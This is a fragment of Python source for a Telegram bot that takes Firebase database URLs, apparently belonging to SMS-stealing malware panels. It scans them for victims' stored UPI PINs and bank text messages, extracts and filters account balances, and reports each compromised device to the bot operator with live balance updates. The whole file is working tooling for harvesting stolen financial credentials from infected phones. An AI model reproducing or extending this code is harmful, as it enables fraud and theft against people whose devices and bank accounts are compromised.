        try: await msg.edit_text("🛑 <b>SEARCH STOPPED</b>", parse_mode="HTML")
        except: pass
        raise
    finally:
        state["search_active"] = False

# ══════════════════════════════════════════════════════
# 🫆 UPI SCAN
# ══════════════════════════════════════════════════════
async def scan_upi_pins(ctx: ContextTypes.DEFAULT_TYPE, user_id: int, state):
    local_kill = state["kill_switch"]
    found_count = 0
    sem = asyncio.Semaphore(10)

    async def check_dev(fb, dev):
        nonlocal found_count
        if local_kill.is_set(): return
        async with sem:
            raw_pin = str(dev.get("upipin", "")).strip()
            if not raw_pin or raw_pin.lower() == "null" or local_kill.is_set(): return
            try:
                await ctx.bot.send_message(user_id, format_upi_card(fb["label"], dev), parse_mode="HTML")
                found_count += 1
            except: pass

    try:
        for fb in list(state["firebases"].values()):
            if local_kill.is_set(): return
            data = await fb_get(fb["url"], "clients", timeout=5)
            if not data or local_kill.is_set(): continue
            await asyncio.gather(*[check_dev(fb, dev) for dev in parse_devices(data)], return_exceptions=True)
        if not local_kill.is_set():
            await ctx.bot.send_message(user_id, f"✅ <b>UPI SCAN COMPLETE</b>\nFound <b>{found_count}</b> devices.", parse_mode="HTML")
    except asyncio.CancelledError:
        return
    finally:
        state["upi_active"] = False

# ══════════════════════════════════════════════════════
# 📥 PROCESS URLS
# ══════════════════════════════════════════════════════
async def process_urls(update: Update, ctx: ContextTypes.DEFAULT_TYPE, text: str, msg=None):
    state = get_user_state(update.effective_user.id)
    urls = re.findall(r'https?://[a-zA-Z0-9\-]+-default-rtdb\.(?:firebaseio\.com|asia-southeast1\.firebasedatabase\.app|europe-west1\.firebasedatabase\.app)', text)
    urls = list(set(urls))
    if not urls:
        if msg: await msg.edit_text("❌ <b>INVALID FIREBASE URL</b>", parse_mode="HTML")
        return
    if not msg: msg = await update.message.reply_text(f"🔍 <b>PROCESSING {len(urls)} URLs...</b>", parse_mode="HTML")
    else: await msg.edit_text(f"🔍 <b>PROCESSING {len(urls)} URLs...</b>", parse_mode="HTML")
    
    results = await asyncio.gather(*[validate_firebase(u) for u in urls], return_exceptions=True)
    added = 0
    for url, is_valid in zip(urls, results):
        if is_valid is True and url not in state["firebases"]:
            state["firebases"][url] = {"url": url, "label": url.split("//")[1].split(".")[0]}
            added += 1
    report = f"✅ <b>{added} NEW DATABASE(S) ADDED</b>\nTotal: <b>{len(state['firebases'])}</b>\n\n👉 <i>Use the menu below to start scanning.</i>"
    await msg.edit_text(report, parse_mode="HTML")

# ══════════════════════════════════════════════════════
# ⚡ BACKGROUND SCANNER (FAST + STOP FIX)
# ══════════════════════════════════════════════════════
async def background_scanner(bot, user_id: int, state):
    local_kill = state["kill_switch"]
    sem = asyncio.Semaphore(10)

    async def process_device(fb, dev):
        if local_kill.is_set(): return
        async with sem:
            if local_kill.is_set(): return
            mdata = await fb_get(fb["url"], f"messages/{dev['id']}", timeout=5)
            if not mdata or local_kill.is_set(): return
            valid_bank_msgs = [m for m in parse_msgs(mdata) if is_bank_sms(m["message"]) and is_recent(m["timestamp"])]
            if not valid_bank_msgs or local_kill.is_set(): return
            latest_bal = extract_balance_float(valid_bank_msgs[0]["message"])
            if latest_bal >= 0:
                if state["filter_min"] > 0 and latest_bal < state["filter_min"]: return
                if state["filter_max"] > 0 and latest_bal > state["filter_max"]: return
            if local_kill.is_set(): return
            state_key = f"{fb['url']}|{dev['id']}"
            card_text = format_deep_scan_card(fb["label"], dev, valid_bank_msgs[:5])
            bal_str = str(latest_bal)
            prev = state["device_state"].get(state_key)
            try:
                if prev is None:
                    sent = await bot.send_message(user_id, card_text, parse_mode="HTML")
                    state["device_state"][state_key] = {"msg_id": sent.message_id, "bal": bal_str}
                elif prev["bal"] != bal_str:
                    await bot.edit_message_text(chat_id=user_id, message_id=prev["msg_id"], text=card_text, parse_mode="HTML")
                    prev["bal"] = bal_str
            except: pass

    try:
        while not local_kill.is_set():
            if not state["scan_active"] or not state["firebases"]:
                await asyncio.sleep(0.5)
                continue
            for fb in list(state["firebases"].values()):
                if local_kill.is_set(): return
                data = await fb_get(fb["url"], "clients", timeout=6)
                if not data or local_kill.is_set(): continue
                devices = parse_devices(data)
                await asyncio.gather(*[process_device(fb, d) for d in devices], return_exceptions=True)
                if local_kill.is_set(): return
            for _ in range(3):
                if local_kill.is_set(): return
                await asyncio.sleep(0.5)
    except asyncio.CancelledError:
        logger.info(f"scanner cancelled user={user_id}")
        return
    except Exception as e:
        logger.error(f"scanner crash user={user_id}: {e}")

# ══════════════════════════════════════════════════════
# 🚀 BOT STARTUP
# ══════════════════════════════════════════════════════
async def run_bot():
    if not BOT_TOKEN: return print("BOT_TOKEN missing")
    
    app = Application.builder().token(BOT_TOKEN).request(HTTPXRequest(connect_timeout=30, pool_timeout=30)).concurrent_updates(100).build()
    
    try:
        me = await app.bot.get_me()
        print(f"✅ Bot Started Successfully: @{me.username}")
        print(f"👑 Owner ID: {OWNER_ID}")
    except Exception as e:
        print(f"❌ Bot Start Failed: {e}")
        return

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(handle_inline_buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.TXT, handle_document))

    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    try:
        await asyncio.Event().wait()
    finally:
        for uid in list(ACTIVE_TASKS.keys()):
            await _cancel_user_tasks(uid)
        await close_http()
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

if __name__ == "__main__":
    asyncio.run(run_bot())